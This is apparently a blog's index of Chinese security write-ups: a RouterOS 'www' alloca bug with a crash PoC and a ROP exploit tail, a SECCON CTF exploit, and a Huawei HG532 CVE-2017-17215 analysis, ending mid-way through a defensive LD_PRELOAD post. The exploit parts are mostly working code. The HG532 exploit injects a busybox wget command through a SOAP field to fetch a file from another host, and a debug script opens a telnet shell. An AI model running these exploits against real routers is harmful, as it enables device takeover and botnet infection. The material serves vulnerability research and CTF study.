+ 5)</div><div class="line">payload += p32(0x0805b0ec)  # str mage/jpeg</div><div class="line">payload += p32(1)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(halt_addr)</div><div class="line">payload += p32(0x0805670f)  </div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line">payload += p32(strncpy_plt)</div><div class="line">payload += p32(pppppr_addr)</div><div class="line">payload += p32(halt_addr + 2)</div><div class="line">payload += p32(0x0804bca1)  </div><div class="line">payload += p32(2)</div><div class="line">payload += &quot;B&quot; * 8 # padding</div><div class="line"></div><div class="line"></div><div class="line"># call dlsym(0, &quot;system&quot;) get system addr</div><div class="line">payload += p32(dlsym_plt)</div><div class="line">payload += p32(pp_addr)</div><div class="line">payload += p32(0)</div><div class="line">payload += p32(system_addr)</div><div class="line"></div><div class="line">payload += p32(0x0804ab5b)</div><div class="line">payload += &quot;BBBB&quot;  # padding ret</div><div class="line">payload += p32(halt_addr)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s1.send(cyclic(1612) + payload + &quot;B&quot; * 0x100)</div><div class="line">sleep(0.5)</div><div class="line">pause()</div><div class="line">s2.close()</div><div class="line"></div><div class="line">pause()</div></pre></td></tr></table></figure>
<p><strong>参考</strong></p>
<p><a href="https://github.com/BigNerd95/Chimay-Red" target="_blank" rel="external">https://github.com/BigNerd95/Chimay-Red</a></p>
]]></content>
      
        <categories>
            
            <category> pwn_router_os </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rop by dlsym </tag>
            
            <tag> rop by strncpy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步 Pwn RouterOS之调试环境搭建&&漏洞分析&&poc]]></title>
      <url>/2018/01/05/pwn_routeros_step_2_poc.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>本文分析 <code>Vault 7</code> 中泄露的 <code>RouterOs</code> 漏洞。漏洞影响 <code>6.38.5</code> 以下的版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">What&apos;s new in 6.38.5 (2017-Mar-09 11:32):</div><div class="line">!) www - fixed http server vulnerability;</div></pre></td></tr></table></figure>
<p>文中涉及的文件：</p>
<p>链接: <a href="https://pan.baidu.com/s/1i5oznSh" target="_blank" rel="external">https://pan.baidu.com/s/1i5oznSh</a> 密码: 9r43</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>补丁对比&amp;&amp;漏洞分析</strong></p>
<p>首先我们先来看看漏洞的原理，漏洞位于 <code>www</code> 文件。</p>
<p>我们需要拿到 <code>www</code> 文件， 直接用 <code>binwalk</code> 提取出 <code>router os</code> 镜像文件的所有内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binwalk -Me mikrotik-6.38.4.iso</div></pre></td></tr></table></figure>
<p>然后在提取出的文件中搜索即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515165746693cgztdv73.png?imageslim" alt="paste image"></p>
<p>同样的方法提取出 <code>mikrotik-6.38.5.iso</code> 中的 <code>www</code> 文件。</p>
<p>然后使用 <code>diaphora</code> 插件 对 这两个文件进行补丁比对 （因为 <code>6.38.5</code> 正好修复了漏洞）</p>
<p>首先打开 <code>www_6384</code> (6.38.4版本的文件）， 然后使用 <code>diaphora</code> 导出 <code>sqlite</code> 数据库， <code>diaphora</code> 使用这个数据库文件进行 <code>diff</code> 操作。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166093523oxrusj58.png?imageslim" alt="paste image"></p>
<p>然后打开 <code>www_6385</code> (6.38.5版本的文件），使用 <code>diaphora</code> 进行 <code>diff</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166195628syhogd51.png?imageslim" alt="paste image"></p>
<p>找到相似度比较低的函数</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515165950046enxkrdzl.png?imageslim" alt="paste image"></p>
<p>选中要查看差异的 条目 ，然后右键 </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166256270id9v1odu.png?imageslim" alt="paste image"><br>可以选择查看 <code>diff</code> 的选项，使用 <code>diff pseudo-code</code> 就可以对 <code>伪c</code> 代码  <code>diff</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166371796rzohbnad.png?imageslim" alt="paste image"></p>
<p>对比 <code>diff</code> 可以发现， 修复漏洞后的程序 没有了 <code>alloca</code>， 而是直接使用 <code>string::string</code> 构造了 字符串。</p>
<p>下面直接分析 <code>www_6384</code> .</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166511848had11egp.png?imageslim" alt="paste image"><br>获取 <code>content-length</code> 的值之后，就传给了 <code>alloca</code> 分配内存。</p>
<p>这里和前文不同的是，这里 <code>alloca</code>的参数是 无符号数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515166646043t0iiacnt.png?imageslim" alt="paste image"><br>所以我们能修改的是栈顶以上的数据，触发崩溃的poc.</p>
<p><strong>poc</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def makeHeader(num):</div><div class="line">    return &quot;POST /jsproxy HTTP/1.1\r\nContent-Length: &quot; + str(num) + &quot;\r\n\r\n&quot;</div><div class="line">s1 = remote(&quot;192.168.2.124&quot;, 80)</div><div class="line">s1.send(makeHeader(-1) + &quot;A&quot; * 1000)</div></pre></td></tr></table></figure>
<p>注：ip 按实际情况设置</p>
<p><strong>调试环境搭建&amp;&amp;Poc测试</strong></p>
<p>首先我们得先安装 <code>routeros</code>， 使用 <code>vmware</code> 加载 <code>iso</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151516721340747r1xr5x.png?imageslim" alt="paste image"></p>
<p>注： <code>routeros</code> 是 32 位的， 硬盘类型要为 <code>ide</code> 否则会找不到驱动。</p>
<p>然后开启虚拟机，就会进入</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167336617v46o0ig8.png?imageslim" alt="paste image"></p>
<p>按 <code>a</code>选择所有 ，然后按 <code>i</code> 进行安装，然后一直输入 <code>y</code> 确定即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167432691gf6rqz53.png?imageslim" alt="paste image"><br>安装完成后，重启，就会进入 登录界面了，使用 <code>admin</code> 和空密码登录即可。</p>
<p>然后输入 <code>setup</code> ，接着输入 <code>a</code>, 按照提示配置好 <code>ip</code> 地址。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167541207kvenwy3d.png?imageslim" alt="paste image"><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167628938ab0thmw5.png?imageslim" alt="paste image"></p>
<p>然后就可以使用 <code>ssh</code> 登录了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515167693696iosa57jc.png?imageslim" alt="paste image"></p>
<p><code>Router Os</code> 对 <code>linux</code> 做了大量的裁剪，所以我们需要给系统增加一些文件方便进行调试，<code>busybox</code> 和 <code>gdbserver</code> （文件在百度云内）。</p>
<p>要增加文件需要使用一个 <code>live-cd</code> 版的 <code>linux</code> 挂载 <code>router os</code> 的磁盘分区，增加文件。这里使用了 <code>ubuntu</code>. </p>
<p>关闭虚拟机，设置光盘镜像，然后修改引导为 光盘即可进入 <code>live-cd</code>。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168110904jefbfa9f.png?imageslim" alt="paste image"></p>
<p>选择 <code>try ubuntu</code>, 进入系统后，挂载 <code>/dev/sda1</code> 和 <code>/dev/sda2</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168515234ev3kupe7.png?imageslim" alt="paste image"></p>
<p>把 <code>busybox</code> 和 <code>gdbserver</code> 放到 <code>bin</code> 目录(不是在<code>/dev/sda1</code>  就是在 <code>/dev/sda2</code> )下，然后在 <code>etc</code> 目录下新建 <code>rc.d/run.d/S99own</code>, 内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">mkdir /ram/mybin</div><div class="line">/flash/bin/busybox-i686 --install -s /ram/mybin</div><div class="line">export PATH=/ram/mybin:$PATH</div><div class="line">telnetd -p 23000 -l bash</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168595733d7l2hl3n.png?imageslim" alt="paste image"></p>
<p><code>umount</code> 然后去掉光盘， 重新启动，应该就可以 <code>telnet 192.168.2.124 23000</code> 连接了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168775379dbz2ytfl.png?imageslim" alt="paste image"></p>
<p>此时使用 </p>
<p><code>gdbserver.i686 192.168.2.124:5050 --attach $(pidof www)</code></p>
<p>如图<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168937045jx5tlvv1.png?imageslim" alt="paste image"></p>
<p>然后 gdb 连上去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">target remote 192.168.2.124:5050</div></pre></td></tr></table></figure>
<p>-<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515168983975bczey67j.png?imageslim" alt="paste image"></p>
<p>运行<code>poc</code>,程序崩溃。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515169108092kn41spn7.png?imageslim" alt="paste image"></p>
<p>参考：</p>
<p><a href="https://github.com/BigNerd95/Chimay-Red/" target="_blank" rel="external">https://github.com/BigNerd95/Chimay-Red/</a></p>
]]></content>
      
        <categories>
            
            <category> pwn_router_os </category>
            
        </categories>
        
        
        <tags>
            
            <tag> diff </tag>
            
            <tag> setup env </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步 Pwn RouterOS之ctf题练手]]></title>
      <url>/2018/01/05/pwn_with_routeros_ctf.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>本文目的是以一道比较简单的 <code>ctf</code> 的练手，为后面的分析  <code>RouterOs</code> 的 漏洞和写 <code>exploit</code> 打基础。</p>
<p><code>Seccon CTF quals 2016</code> 的一道题。</p>
<p>题目，idb 文件：</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先看看 <code>main</code> 函数的代码。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15151601513002tz99qyj.png?imageslim" alt="paste image"></p>
<p>逻辑还是比较简单的获取输入后，简单的加了 <code>30</code> 就给 <code>alloca</code> 去分配空间，然后进入 <code>message</code> 函数。</p>
<p><code>alloca</code> 函数是 从 栈上分配内存， 它分配内存是通过 <code>sub esp , *</code> 来实现的，我们可以转到汇编代码看看。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515160871164u36cvqez.png?imageslim" alt="paste image"></p>
<p>可以看到调用 <code>alloca</code> 实际就是通过 <code>sub esp, eax</code> 来分配栈内存。</p>
<p>我们输入的 <code>num</code> 是 <code>int</code> 类型的</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515161037092srnu0pi2.png?imageslim" alt="paste image"></p>
<p>如果我们输入 <code>num</code> 为 负数， <code>sub esp</code> 就相当于 <code>add esp</code> 我们可以把栈指针往栈底移动。</p>
<p>继续往下看</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515161251064vsu5zpke.png?imageslim" alt="paste image"></p>
<p>接下来会调用 <code>message</code> 函数， 可以看到传给他的参数为 <code>esp + 23</code> 和 <code>num</code> ， 进入 <code>message</code> 函数 ，看看他的逻辑。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515161389377ru08eqe3.png?imageslim" alt="paste image"><br>首先读取 <code>n</code> 个字符 到 <code>buf</code> ， 这两个变量就是我们传入的参数。</p>
<p>然后读入 <code>0x40</code> 个字符到  <code>message</code> 函数自己定义的局部变量中。</p>
<p>一切都很正常，没有溢出，没有格式化字符串漏洞。</p>
<p>程序的漏洞在于传入的 <code>buf</code> 是通过 <code>alloca</code> 分配的内存，我们可以通过输入 负数 使得 <code>alloca</code>的参数为负， 这样我们就可以把 <code>esp</code> 往栈底移动，栈底有<strong>返回地址</strong>, 然后通过 <code>message</code>  中读取数据，覆盖 <code>eip</code> 然后进行 <code>rop</code> 即可。</p>
<p>要触发漏洞我们需要输入负数，所以在 </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515162118968n3v5nlzd.png?imageslim" alt="paste image"><br>会直接返回，不会获取输入，因为它里面调用的是 <code>fgets</code>来获取输入。<code>fgets</code>会有检查。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515162247314nycp4hlw.png?imageslim" alt="paste image"></p>
<p>所以我们只能往 <code>message</code> 函数内的缓冲区 <code>t_buf</code>写数据，不过这个缓冲区也是在栈上，同样与 <code>esp</code> 相关，所以我们把<code>esp</code> 往栈底移时，它也是会跟着下移，通过它也可以写 <code>返回地址</code> 的值。</p>
<p>我们可以输入 <code>-140</code>(这个值可以通过 先输入一个 比较小的比如 <code>-32</code>, 然后计算最后得到的数据的地址距离返回地址位置的距离，来继续调整)</p>
<p>在 <code>0x0804860E</code> 设个断点</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515164055082ht6doej3.png?imageslim" alt="paste image"></p>
<p><code>sub</code> 之后<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515164096301tgle7wih.png?imageslim" alt="paste image"></p>
<p>可以看到 <code>esp</code> 已经增大。<br>然后加上一定的 <code>padding</code> (可以使用 <code>pwntools</code> 的 <code>cyclic</code> 计算) ，就能修改 返回地址了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515164574183kx3lzgi2.png?imageslim" alt="paste image"></p>
<p>之后就是正常的 <code>rop</code></p>
<hr>
<p>使用 <code>printf</code> 打印 <code>got</code> 表中的 <code>printf</code> 的值，泄露 <code>libc</code> 的地址。然后回到程序的开始，再次触发漏洞， 调用 <code>system(&quot;sh&quot;)</code></p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>alloca</code> 的细节要注意， 注意输入的数据是有符号的还是无符号的。对于后面计算偏移，可以先动态调试计算一个粗略的值，然后使用 <code>cyclic</code> 确定精确的偏移。</p>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</div><div class="line">r = process(&quot;./cheer_msg&quot;)</div><div class="line"></div><div class="line">binary = ELF(&apos;cheer_msg&apos;)</div><div class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc-2.23.so&apos;)</div><div class="line"></div><div class="line">gdb.attach(r, &apos;&apos;&apos;</div><div class="line">bp 0x0804868B</div><div class="line">bp 0x08048610</div><div class="line">	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">r.recvuntil(&quot;Length &gt;&gt; &quot;)</div><div class="line">r.sendline(&quot;-140&quot;)</div><div class="line">r.recvuntil(&quot;Name &gt;&gt; &quot;)</div><div class="line"></div><div class="line">payload = &quot;a&quot; * 0x10 # padding</div><div class="line">payload += p32(binary.symbols[&apos;printf&apos;])</div><div class="line">payload += p32(binary.entry)  # ret to start</div><div class="line">payload += p32(binary.got[&apos;printf&apos;])</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line"></div><div class="line">r.recvuntil(&quot;Message :&quot;)</div><div class="line">r.recv(1)</div><div class="line">r.recv(1)</div><div class="line">printf_addr = u32(r.recv(4))</div><div class="line">libc_base = printf_addr - libc.symbols[&apos;printf&apos;]</div><div class="line">sh = libc_base + libc.search(&quot;/bin/sh\x00&quot;).next()</div><div class="line">system = libc_base + libc.symbols[&apos;system&apos;]</div><div class="line"></div><div class="line">log.info(&quot;got system: &quot; + hex(system))</div><div class="line">log.info(&quot;got base: &quot; + hex(libc_base))</div><div class="line">log.info(&quot;get sh &quot; + hex(sh))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(&quot;Length &gt;&gt; &quot;)</div><div class="line">r.sendline(&quot;-140&quot;)</div><div class="line">r.recvuntil(&quot;Name &gt;&gt; &quot;)</div><div class="line"></div><div class="line">payload = &quot;a&quot; * 0x10 # padding</div><div class="line">payload += p32(system)</div><div class="line">payload += p32(binary.entry)</div><div class="line">payload += p32(sh)</div><div class="line">r.sendline(payload)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg" target="_blank" rel="external">https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg</a></p>
]]></content>
      
        <categories>
            
            <category> pwn_router_os </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> alloca </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2017-17215 - 华为HG532命令注入漏洞分析]]></title>
      <url>/2017/12/28/cve_2017_17215_hg532.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面几天国外有个公司发布了该漏洞的详情。入手的二手 <code>hg532</code> 到货了，分析测试一下。</p>
<p>固件地址：<a href="https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar" target="_blank" rel="external">https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞位于 <code>upnp</code> 服务处理 升级的流程中，用于设备升级的 <code>upnp</code> 服务 <code>xml</code> 配置文件为 <code>etc/upnp/DevUpg.xml</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;scpd xmlns=&quot;urn:schemas-upnp-org:service-1-0&quot;&gt;</div><div class="line">&lt;specVersion&gt;</div><div class="line">&lt;major&gt;1&lt;/major&gt;</div><div class="line">&lt;minor&gt;0&lt;/minor&gt;</div><div class="line">&lt;/specVersion&gt;</div><div class="line">&lt;actionList&gt;</div><div class="line">&lt;action&gt;</div><div class="line">&lt;name&gt;Upgrade&lt;/name&gt;</div><div class="line">&lt;argumentList&gt;</div><div class="line">&lt;argument&gt;</div><div class="line">&lt;name&gt;NewDownloadURL&lt;/name&gt;</div><div class="line">&lt;direction&gt;in&lt;/direction&gt;</div><div class="line">&lt;relatedStateVariable&gt;DownloadURL&lt;/relatedStateVariable&gt;</div><div class="line">&lt;/argument&gt;</div><div class="line">&lt;argument&gt;</div><div class="line">&lt;name&gt;NewStatusURL&lt;/name&gt;</div><div class="line">&lt;direction&gt;in&lt;/direction&gt;</div><div class="line">&lt;relatedStateVariable&gt;StatusURL&lt;/relatedStateVariable&gt;</div><div class="line">&lt;/argument&gt;</div><div class="line">&lt;/argumentList&gt;</div><div class="line">&lt;/action&gt;</div><div class="line">&lt;action&gt;</div><div class="line">&lt;name&gt;GetSoftwareVersion&lt;/name&gt;</div><div class="line">&lt;argumentList&gt;</div><div class="line">&lt;argument&gt;</div><div class="line">&lt;name&gt;NewSoftwareVersion&lt;/name&gt;</div><div class="line">&lt;direction&gt;out&lt;/direction&gt;</div><div class="line">&lt;relatedStateVariable&gt;SoftwareVersion&lt;/relatedStateVariable&gt;</div><div class="line">&lt;/argument&gt;</div><div class="line">&lt;/argumentList&gt;</div><div class="line">&lt;/action&gt;</div><div class="line">&lt;/actionList&gt;</div><div class="line">&lt;serviceStateTable&gt;</div><div class="line">&lt;stateVariable sendEvents=&quot;no&quot;&gt;</div><div class="line">&lt;name&gt;DownloadURL&lt;/name&gt;</div><div class="line">&lt;dataType&gt;string&lt;/dataType&gt;</div><div class="line">&lt;/stateVariable&gt;</div><div class="line">&lt;stateVariable sendEvents=&quot;no&quot;&gt;</div><div class="line">&lt;name&gt;StatusURL&lt;/name&gt;</div><div class="line">&lt;dataType&gt;string&lt;/dataType&gt;</div><div class="line">&lt;/stateVariable&gt;</div><div class="line">&lt;stateVariable sendEvents=&quot;no&quot;&gt;</div><div class="line">&lt;name&gt;SoftwareVersion&lt;/name&gt;</div><div class="line">&lt;dataType&gt;string&lt;/dataType&gt;</div><div class="line">&lt;/stateVariable&gt;</div><div class="line">&lt;/serviceStateTable&gt;</div><div class="line">&lt;/scpd&gt;</div></pre></td></tr></table></figure>
<p>其中在获取 <code>NewDownloadURL</code> 和     <code>StatusURL</code> 后拼接命令，调用了 <code>system</code> 执行了。</p>
<p><code>ida</code> 搜关键字 </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1514463385981gpkpn9k5.png?imageslim" alt="paste image"></p>
<p>交叉引用找到使用位置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1514463431730l5deva3o.png?imageslim" alt="paste image"></p>
<p>调用 <code>xml</code> 相关函数，获取值，拼接后，进入 <code>system</code></p>
<p>他还有 认证 机制，需要 <code>Authorization</code> 头 才能过掉 <code>check</code>, 否则会 <code>401</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15144675714407pfmdkor.png?imageslim" alt="paste image"></p>
<p><strong>exp</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</div><div class="line">&#125;</div><div class="line"></div><div class="line">data = &apos;&apos;&apos;&lt;?xml version=&quot;1.0&quot; ?&gt;</div><div class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</div><div class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</div><div class="line">   &lt;NewStatusURL&gt;;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;&lt;/NewStatusURL&gt;</div><div class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</div><div class="line">  &lt;/u:Upgrade&gt;</div><div class="line"> &lt;/s:Body&gt;</div><div class="line">&lt;/s:Envelope&gt;</div><div class="line">&apos;&apos;&apos;</div><div class="line">requests.post(&apos;http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1&apos;,headers=headers,data=data)</div></pre></td></tr></table></figure>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>找对固件很重要， 立个 <code>flag</code> ,两个月内不用 <code>f5</code>. 一个好的蜜罐就是<code>cve</code> 接收器呀<del>~</del>~~</p>
<p><strong>参考</strong></p>
<p><a href="https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant" target="_blank" rel="external">https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant</a></p>
<p><a href="https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant" target="_blank" rel="external">https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2017-17215 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用LD_PRELOAD防御pwn]]></title>
      <url>/2017/12/23/defense_pwn_with_ld_preload.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文介绍使用 <code>LD_PRELOAD</code> 防御 线下赛中常见的漏洞。</p>
<p>github上的相关项目：</p>
<p><code>hook</code> 了常用的函数</p>
<p><a href="https://github.com/poliva/ldpreloadhook" target="_blank" rel="external">https://github.com/poliva/ldpreloadhook</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>由于可能会不允许加载 <code>脚本</code> ,所以用 <code>c</code> 来加载（可能需要加一些没有的东西凑大小）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line">  </div><div class="line">int main(int arg,char **args)  </div><div class="line">&#123;  </div><div class="line">  </div><div class="line">    char *argv[]=&#123;&quot;test&quot;,NULL&#125;;//传递给执行文件的参数数组，这里包含执行文件的参数   </div><div class="line">  </div><div class="line">    char *envp[]=&#123;&quot;LD_PRELOAD=./libmy_printf.so&quot;,NULL&#125;;//传递给执行文件新的环境变量数组  </div><div class="line">  </div><div class="line">    execve(&quot;./test&quot;,argv,envp);  </div><div class="line">   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行当前目录的 <code>test</code> 文件，同时设置 <code>LD_PRELOAD=./libmy_printf.so</code>,  运行时加载 <code>libmy_printf.so</code></p>
<p>.</p>
<p><strong>堆相关漏洞</strong></p>
<p>使用 <a href="https://github.com/DhavalKapil/libdheap" target="_blank" rel="external">https://github.com/DhavalKapil/libdheap</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;  </div><div class="line">#include &lt;unistd.h&gt;  </div><div class="line">  </div><div class="line">int main(int arg,char **args)  </div><div class="line">&#123;  </div><div class="line">  </div><div class="line">    char *argv[]=&#123;&quot;test&quot;,NULL&#125;;//传递给执行文件的参数数组，这里包含执行文件的参数   </div><div class="line">  </div><div class="line">	char *envp[]=&#123;&quot;LD_PRELOAD=./libdheap.so&quot;, 